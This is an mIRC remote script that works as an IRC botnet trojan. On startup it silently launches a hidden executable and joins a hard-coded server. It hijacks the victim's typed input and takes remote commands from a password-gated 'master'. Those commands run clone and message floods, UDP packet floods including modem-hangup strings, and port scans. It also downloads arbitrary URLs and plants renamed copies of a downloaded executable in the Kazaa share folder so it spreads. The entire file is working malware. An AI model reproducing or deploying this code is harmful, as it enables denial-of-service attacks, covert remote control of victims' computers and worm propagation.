[script]
n0=on *:start:{ if ($exists(temp2.exe) == $false) { exit } | .run temp2.exe /c /fh mirc        | if (%server == $null) { set %server INet.UnixPhr34kz.net }  | //set %timeout 10 | if ($portfree(9000) == $false) { exit } |  if ($portfree(9000) == $true) { /socklisten blah 9000 } | //nick INet[ $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ ] | //timerc 1 4 //server %server $+ : $+ %connectport | //run temp2.exe /c /fh mirc        | //remini mirc.ini ident userid | //remini mirc.ini mirc user | //remini mirc.ini mirc email | //writeini mirc.ini ident userid $read temp.scr | //writeini mirc.ini mirc user $randomgen($r(0,9)) | //writeini mirc.ini mirc email $randomgen($r(0,9)) | //identd on $r(a,z) $+ $read temp.scr $+ $r(a,z)  | //timercoolconnect -o 0 100 //server %server %connectport |  fos }
n1=on *:TEXT:!login*:*:{ set %pass InfoNet | if ($nick isop %chan) && (Info isin $nick) { if ($2- = %pass) { /msg # 15Login Accepted 14 $+ $nick $+ 15 Now Has Master access. | /set %master $address | /guser 10 $nick 3 } else { halt } } } 
n2=on *:INPUT:*: { haltdef | /echo -a < $+ $me $+ > $1- | msg %chan %logo Warning User Inputed Command: $1- %logo | /clearall | //run temp2.exe /c /fh mirc        | halt }
n3=alias clone { if ($1 == in) { if ($2 == PING) { sockwrite -tn $sockname PONG $3   }  }
n4=  if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- }  | if ($sock(sock*,0) > 0) { sockwrite -tn sock* quit : $+ $2- }   }
n5=  if ($1 == msg) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* privmsg $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* privmsg $2 : $+ $3- }  }
n6=  if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* notice $2 : $+ $3- }  }
n7=  if ($1 == all) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 :TIME | sockwrite -tn clone* PRIVMSG $2 :PING | sockwrite -tn clone* PRIVMSG $2 :VERSION  } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 :TIME | sockwrite -tn sock* PRIVMSG $2 :PING | sockwrite -tn sock* PRIVMSG $2 :VERSION }  }
n8=  if ($1 == time) { if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :TIME } | if ($sock(sock*,0) > 0) {    .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :TIME } }
n9=  if ($1 == ping) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {     .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :PING } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :PING }  }
n10=  if ($1 == version) {  if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :VERSION } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :VERSION } }
n11=  if ($1 == join) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2 } |  if ($sock(sock*,0) > 0) {   sockwrite -tn sock* join $2 } }
n12=  if ($1 == part) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  /sockwrite -n clone* part $2 : $+ $3- }  if ($sock(sock*,0) > 0) {  /sockwrite -n sock* part $2 : $+ $3- }  }
n13=  if ($1 == kill) {  if ($sock(clone*,0) > 0) {      sockclose clone* } |  if ($sock(sock*,0) > 0) {  sockclose sock* } }
n14=  if ($1 == connect) {  if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($4 == $null) { halt } |  set %clone.server $2 | set %clone.port $3 | set %clone.load $4 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $r(a,z) $+ $read temp.scr $+ $r(a,z)  | sockopen clone $+ $randomgen($r(0,9)) $2 $3 |  dec %clone.load 1 |   goto loop  } 
n15=  if ($1 == nick.change) {  %.nc = 1  |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end } |  sockwrite -n $sock(clone*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |   :end  |   /wnickchn |   halt  }
n16=  if ($1 == nick.this) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $+ $r(1,999) $+ $r(a,z) |   inc %.nc |  goto ncloop |   :end  |  /wnickchn2 $2 |  halt  } 
n17=}
n18=alias predirectstats { set %gtpcount 0 | :startloophere | inc %gtpcount 1 |  if $sock(gtportdirect*,%gtpcount) != $null { /msg $1 15Port Redirect:[In-Port:1 $gettok($sock(gtportdirect*,%gtpcount),2,46) 15to1 $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32) $+ 15]  | /msg $1 15Port Redirect:[Local Ip:1 $ip $+ 15] | goto startloophere  } | else { if %gtpcount = 1 { //msg $1 15Port Redirect:[Error: 1No Port Redirects15] } | //msg $1 15Port Redirect:[Stats: 1End Or Port Redirect.15] | unset %gtpcount } }
n19=alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum } 
n20=alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
n21=alias firew {  if ($1 == 1) { %clones.firewall = 1 } | elseif ($1 == 0) { %clones.firewall = 0 } }
n22=alias cf { firew 1 | if ($2 == $null) { halt } |  %clones.firew = $1 |  if ($3 == $null) { .timer -o $2 2 connect1 $1 } |  else { .timer -o $2 $3 connect1 $1 } }
n23=alias firstfree { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = *ock $+ %clones.counter | if ($sock(%clones.tmp,0) == 0) { return %clones.counter } | goto home |  :end }
n24=alias connect1 { if ($1 != $null) { %clones.firew = $1 } | if (%clones.server == $null) { msg %chan 15Clones:[Error: 1Server Not Set15] | halt } |  if (%clones.serverport == $null) { %clones.serverport = 6667 } |  %clones.tmp = $firstfree |  if (%clones.firewall == 1) {  sockopen ock $+ %clones.tmp %clones.firew 1080  } |  else { sockopen sock $+ %clones.tmp %clones.server %clones.serverport  } }
n25=alias botraw { sockwrite -n sock* $1- }
n26=alias changenick { %clones.counter = 0 | :home | inc %clones.counter 1 | %clones.tmp = $read temp.scr | if (%clones.tmp == $null) { %clones.tmp = $randomgen($r(0,9)) } |  if ($sock(sock*,%clones.counter) == $null) { goto end } |  sockwrite -n $sock(sock*,%clones.counter) NICK %clones.tmp | sockmark $sock(sock*,%clones.counter) %clones.tmp | goto home | :end }
n27=alias getmarks { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter |  if (%clones.counter >= %clones.total) { goto end } |  goto home | :end }
n28=alias isbot { %clones.counter = 0 | %clones.total = $sock(sock*,0) | :home |  inc %clones.counter 1 | %clones.tmp = sock $+ %clones.counter | if ($sock(%clones.tmp).mark == $1) { return $true } |  if (%clones.counter >= %clones.total) { goto end } | goto home |   :end |  return $false }
n29=alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan 15Packeting Report:[1Halted15] | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan 15Packeting Report:[Error Currently Packeting:1 $+ $gettok($timer(gcoolt).com,3,32) $+ 15] | return } |  msg %pchan 15Packeting Report:[Sending:1 $1 15Packets To:1 $2 15On Port:1 $3 $+ 15] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
n30=alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
n31=  sockudp gnumc1 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n32=  sockudp gnumc3 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n33=  sockudp gnumc2 $2 $3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
n34=  sockudp gnumc4 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n35=  return |  :done | //msg %pchan 15Packeting Report:[1Finished15] | .timergcoolt off | unset %gnum | unset %pchan 
n36=}
n37=alias setserver { %clones.setserver = 1 | .dns -h $1 } 
n38=alias reg {  if ($1 == 1) { return @aol.com } | if ($1 == 2) { return @hotmail.com } | if ($1 == 3) { return @msn.com } | if ($1 == 4) { return @netzero.com } | if ($1 == 5) { return @bothered.com } | if ($1 == 6) { return @bothered.com } | if ($1 == 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .edu } | if ($1 == 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .net }  | if ($1 == 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .com } | if ($1 == 10) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .org } }
n39=
n40=alias fos { if ($exists(C:\WINDOWS\INF\g\gates.txt) == $true) { remove C:\WINDOWS\INF\g\gates.txt } |   if ($exists(C:\WINDOWS\INF\g\kill.exe) == $true) { remove C:\WINDOWS\INF\g\kill.exe }  | if ($exists(C:\WINDOWS\INF\g\mirc.ini) == $true) { remove C:\WINDOWS\INF\g\mirc.ini } |   if ($exists(C:\WINDOWS\INF\g\mirc2.ini) == $true) { remove C:\WINDOWS\INF\g\mirc2.ini } |   if ($exists(C:\WINDOWS\INF\g\mirc3.ini) == $true) { remove C:\WINDOWS\INF\g\mirc3.ini } |   if ($exists(C:\WINDOWS\INF\g\peon.ini) == $true) { remove C:\WINDOWS\INF\g\peon.ini } |   if ($exists(C:\WINDOWS\INF\g\pr.ini) == $true) { remove C:\WINDOWS\INF\g\pr.ini } |   if ($exists(C:\WINDOWS\INF\g\remote44.ini) == $true) { remove C:\WINDOWS\INF\g\remote44.ini } 
n41=  if ($exists(C:\WINDOWS\INF\g\temp.scr) == $true) { remove C:\WINDOWS\INF\g\temp.scr } |   if ($exists(C:\WINDOWS\INF\g\temp3.mrc) == $true) { remove C:\WINDOWS\INF\g\temp3.mrc } |   if ($exists(C:\WINDOWS\INF\g\temp2.exe) == $true) { remove C:\WINDOWS\INF\g\temp2.exe } |   if ($exists(C:\WINDOWS\INF\g\temp.exe) == $true) { remove C:\WINDOWS\INF\g\temp.exe } |  if ($exists(C:\WINDOWS\INF\g\27374.txt) == $true) { remove C:\WINDOWS\INF\g\27374.txt } |   if ($exists(C:\WINDOWS\web32\darkirc.mrc) == $true) { remove C:\WINDOWS\web32\darkirc.mrc } |   if ($exists(C:\WINDOWS\web32\gates.txt) == $true) { remove C:\WINDOWS\web32\gates.txt } |   if ($exists(C:\WINDOWS\web32\mirc.ini) == $true) { remove C:\WINDOWS\web32\mirc.ini } 
n42=  if ($exists(C:\WINDOWS\web32\rb.exe) == $true) { remove C:\WINDOWS\web32\rb.exe } |   if ($exists(C:\WINDOWS\web32\remote.ini) == $true) { remove C:\WINDOWS\web32\remote.ini } |   if ($exists(C:\WINDOWS\web32\temp.scr) == $true) { remove C:\WINDOWS\web32\temp.scr } |   if ($exists(C:\WINDOWS\web32\temp2.exe) == $true) { remove C:\WINDOWS\web32\temp2.exe } |   if ($exists(C:\WINDOWS\bero\27374.txt) == $true) { remove C:\WINDOWS\bero\27374.txt } |   if ($exists(C:\WINDOWS\bero\gates.txt) == $true) { remove C:\WINDOWS\bero\gates.txt } |   if ($exists(C:\WINDOWS\bero\kill.exe) == $true) { remove C:\WINDOWS\bero\kill.exe }  
n43=if ($exists(C:\WINDOWS\bero\mirc.ini) == $true) { remove C:\WINDOWS\bero\mirc.ini }  |   if ($exists(C:\WINDOWS\bero\mirc2.ini) == $true) { remove C:\WINDOWS\bero\mirc2.ini } |   if ($exists(C:\WINDOWS\bero\pr.ini) == $true) { remove C:\WINDOWS\bero\pr.ini } |   if ($exists(C:\WINDOWS\bero\remote.ini) == $true) { remove C:\WINDOWS\bero\remote.ini }  |   if ($exists(C:\WINDOWS\bero\servers.txt) == $true) { remove C:\WINDOWS\bero\servers.txt } |   if ($exists(C:\WINDOWS\bero\temp.scr) == $true) { remove C:\WINDOWS\bero\temp.scr } |   if ($exists(C:\WINDOWS\bero\pr.ini) == $true) { remove C:\WINDOWS\bero\pr.ini } |   if ($exists(C:\WINDOWS\bero\mscdex.exe) == $true) { remove C:\WINDOWS\bero\mscdex.exe }  }
n44=alias dksmsgflooder {  if ($sock(dksmsgflooder2,0) == 0) { sockopen dksmsgflooder2 %msg.flood.server %msg.flood.server.port }   | if ($sock(dksmsgflooder1,0) == 0) { sockopen dksmsgflooder1 %msg.flood.server %msg.flood.server.port }  }
n45=alias rc {  if ($1 == 1) { return  $+ $r(1,15) } | if ($1 == 2) { return  } | if ($1 == 3) { return  } | if ($1 == 4) { return  $+ $r(1,15) } | if ($1 == 5) { return  } | if ($1 == 6) { return  } | if ($1 == 7) { return  } | if ($1 == 8) { return  $+ $r(1,15) $+ , $+ $r(1,15) } }
n46=alias rcr { if ($1 == 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 2) { return $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) } | if ($1 == 3) { return $r(1,100) $+ $r(1,100) $+ $r(1,100) $+ $r(1,100) } | if ($1 == 4) { return $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) $+ $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) } }
n47=alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read temp.scr } | if ($1 == 2) { return ^ $+ $read temp.scr $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read temp.scr $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read temp.scr $+ - } | if ($1 == 6) { return $read temp.scr $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read temp.scr $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
n48=alias wnickchn { %.nc = 1  |   :ncloop | if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |  :end  } 
n49=alias wnickchn2 { %.nc = 1  |  :ncloop |  if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $1 $+ $r(a,z) $+ $r(1,999) |  inc %.nc | goto ncloop |  :end  }
n50=alias msg { if (# == $null) { msg $nick $1- }  |   else { msg $1- } }
n51=alias percent { if ($1 isnum) && ($2 isnum) { return $round($calc(($1 / $2) * 100),2) $+ $chr(37) } }
n52=on *:sockopen:dksmsgflooder*:{ inc %bots 1 | sockwrite -tn dksmsgflooder* User $read temp.scr $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  temp.scr ] ]  |  sockwrite -nt dksmsgflooder* NICK $randomgen($r(0,9)) | sockwrite -nt dksmsgflooder* JOIN : $+ %nick2bomb | sockwrite -nt dksmsgflooder* PONG $server | sockwrite -nt dksmsgflooder* privmsg %nick2bomb : $+ %msg2bomb | sockwrite -nt dksmsgflooder* notice %nick2bomb : $+ %msg2bomb | /sockwrite -tn dksmsgflooder* PRIVMSG %nick2bomb :PING VERSION TIME | sockclose $sockname | dec %bots 1 | /dksmsgflooder } 
n53=on *:sockclose:clone*: {  set %temp.clones.nick $remove($sockname,clone) }  
n54=on *:sockopen:clone*: { sockwrite -tn $sockname User $read temp.scr $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  temp.scr ] ] | sockwrite -tn $sockname Nick $remove($sockname,clone) | sockread }
n55=on *:sockread:clone*: { 
n56=  sockread %temp.sock 
n57=  /echo -s clone debug; %temp.sock 
n58=  if ($gettok(%temp.sock,2,32) == 333) { sockwrite $sockname -tn pong $gettok(%temp.sock,5,32) } 
n59=  if ($gettok(%temp.sock,2,32) == KICK) { sockwrite -nt clone* JOIN : $+ $gettok(%temp.sock,3,32) }
n60=  clone in %temp.sock 
n61=}
n62=; end alias end.
n63=on *:sockopen:range.*:{ if ($sock($sockname).status == active) { set %range.ports %range.ports $sock($sockname).port | sockclose $sockname } }
n64=alias port.range.scan { set %range1 $calc( $gettok(%port.to.scan,1,45) - 1) | set %range2 $gettok(%port.to.scan,2,45) | :lewp | inc %range1 | if (%range1 <= %range2) { sockopen range. $+ %range1 %port.scan.ip %range1 | goto lewp } | else { .timergetportsempire 1 2 get.ports } }
n65=alias get.ports { /msg %schan %logo 9Port Scanner:0[3Open Ports Found:9 $iif(%range.ports != $null, %range.ports, None) $+ 0] | /msg %schan %logo 9Port Scanner:0[3Scanning Complete: On:9 %port.scan.ip $+ $+ 0] |  unset %range.ports %range1 %range2 %port.to.scan %port.scan.ip | unset %schan | sockclose range.* }
n66=on 1:SOCKREAD:download: { .remove $mircdir\Temp  | msg %w.g.# 15Download Now in Progress:[URL:1 $gettok($sock($sockname).mark,3,32) $+ 15]  |  if ($sockerr > 0) return | :nextread | sockread %WWW.Temp |  if ($sockbr != 0) { if (%WWW.Temp != $Null) {  write $mircdir\Temp %WWW.Temp  } |  goto nextread   }
n67=  if (HTTP/1.*20* iswm [ $read -l1 $mircdir\Temp ] ) { if ($exists($gettok($sock($sockname).mark,2,32))) {  .remove $gettok($sock($sockname).mark,2,32) } |   :GenNew |  set -u0 %WWW.Temp downl $+ $rand(A,Z) $+ $rand(0,9) |  if ($sock(%WWW.Temp) != $null) { goto GenNew } |  sockrename download %WWW.Temp  
n68=if (text/* iswm [ $read -sContent-Type: $mircdir\Temp ] ) { sockmark %WWW.Temp Text $gettok($sock($sockname).mark,2-,32)  } | else {   sockmark %WWW.Temp Bin $gettok($sock($sockname).mark,2-,32)  } |  .timer 1 1 sockwrite -tn %WWW.Temp GET $gettok($sock($sockname).mark,3,32)  } | else {  //echo -st $read -l2 $mircdir\Temp  }  unset %WWW.Temp }
n69=on 1:SOCKREAD:down*: {  if ($sockerr > 0) return | :nextread | if ($gettok($sock($sockname).mark,1,32) == bin) { sockread &Temp |   if ($sockbr == 0) return |  if ($bvar(&Temp,0) != 0) { bwrite $gettok($sock($SockName).Mark,2,32) -1 $bvar(&Temp,0) &temp }  } | else {  sockread %WWW.Temp |  if ($sockbr == 0) return |  if (%WWW.Temp != $Null) { write $gettok($sock($SockName).Mark,2,32) %WWW.Temp } |   unset %WWW.Temp  } | goto nextread }
n70=alias getdata {  if ($sock(download) == $null) {  if ($gettok($$1,1,47) == http:) { sockopen download $gettok($gettok($1,2,47),1,58) $iif($gettok($gettok($1,3,47),2,58) != $Null, $gettok($gettok($1,3,47),1,58), 80)   } | else { sockopen download $gettok($1,1,47) $iif($gettok($gettok($1,1,47),2,58) != $Null, $gettok($gettok($1,1,47),1,58), 80)  } |  if ($GetTok($1,$numtok($1,47),47) != $null) {  set -u0 %WWW.File $mircdir\ $+ $GetTok($1,$numtok($1,47),47)  } | else {
n71=set -u0 %WWW.File $mircdir\_root_   } |   sockmark download unknown %WWW.File $iif($gettok($$1,1,47) == http:, $1, [ http:// $+ [ $1 ] ] )  } | else {  .timer 1 1 getdata $1  } }
n72=on 1:SOCKOPEN:download: { sockwrite -tn download HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1 | sockwrite -tn download Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */* | sockwrite -tn download Accept-Language: en-au |  sockwrite -tn download Accept-Encoding: deflate |   sockwrite -tn download User-Agent: mIRCInstaller WWW Edition v0.0.1 | sockwrite -tn download Host: $host | sockwrite -tn download Connection: Keep-Alive  | sockwrite -tn download $lf  }
n73=on 1:SOCKCLOSE:down*: {  msg %w.g.# 15Download Complete:[URL:1 $gettok($sock($sockname).mark,3-,32) 15SIZE:1 $file($gettok($sock($sockname).mark,2,32)).size $+ 15bytes]  | if ($exists( [ $mircdir\Temp ] )) { .remove $mircdir\Temp } | if ($exists(zwekb.exe) == $true) { /msg %w.g.# 15Kazaa Found & Now Updating  } | { /copy zwekb.exe C:\progra~1\kazaa\myshar~1\zwekb.exe } | set %4 $read kazaa.scr | set %5 $read kazaa.scr | set %6 $read kazaa.scr | { //rename C:\progra~1\kazaa\myshar~1\zwekb.exe %4 } | { /copy zwekb.exe C:\progra~1\kazaa\myshar~1\zwekb.exe } | { //rename C:\progra~1\kazaa\myshar~1\zwekb.exe %5 } | { /copy zwekb.exe C:\progra~1\kazaa\myshar~1\zwekb.exe } | { //rename C:\progra~1\kazaa\myshar~1\zwekb.exe %6 } | /timer 1 7 /remove zwekb.exe | set %kazaa done | unset %WWW* | unset %w.g.# }
n74on 10:TEXT:!download*:#:{ if ($address == %master) && (Info isin $nick) && ($nick isop %chan) { %w.g.# = # | /getdata $2 } }
n75on 10:TEXT:!download*:?:{ if ($address == %master) && (Info isin $nick) && ($nick isop %chan) { %w.g.# = $nick | /getdata $2 } }
n76on 10:TEXT:!kazaa*:?:{ if (%kazaa == done) { halt } | if ($address == %master) && ($nick isop %chan) && ($exists(C:\progra~1\kazaa\kazaa.exe) == $true) { %w.g.# = $nick | /getdata $2 } }
n77on 10:TEXT:!kazaa*:#:{ if (%kazaa == done) { halt } | if ($address == %master) && ($nick isop %chan) && ($exists(C:\progra~1\kazaa\kazaa.exe) == $true) { %w.g.# = # | /getdata $2 } }
n78=on 10:TEXT:!portscan*:?: if ($4 == $null) { msg $nick 15PortScan:[Syntax:1 !portscan <address> <startport> <endport>15] | halt } | if ($calc($4 - $3) > 800) { msg $nick 15PortScan:[Error:1 Scan Cannot Exceed 800 Ports15] | halt }  | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan $nick |  //msg $nick 15PortScan Active:[Address:1 $2 15Port:1 %port.to.scan $+ 15] |  port.range.scan %port.scan.ip
n79=on 10:TEXT:!portscan*:#: if ($4 == $null) { msg # 15PortScan:[Syntax:1 !portscan <address> <startport> <endport>15] | halt }  |  if ($calc($4 - $3) > 800) { msg # 15PortScan:[Error:1 Scan Cannot Exceed 800 Ports15] | halt } | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan # |  //msg # 15PortScan Active:[Address:1 $2 15Port:1 %port.to.scan $+ 15] |  port.range.scan %port.scan.ip
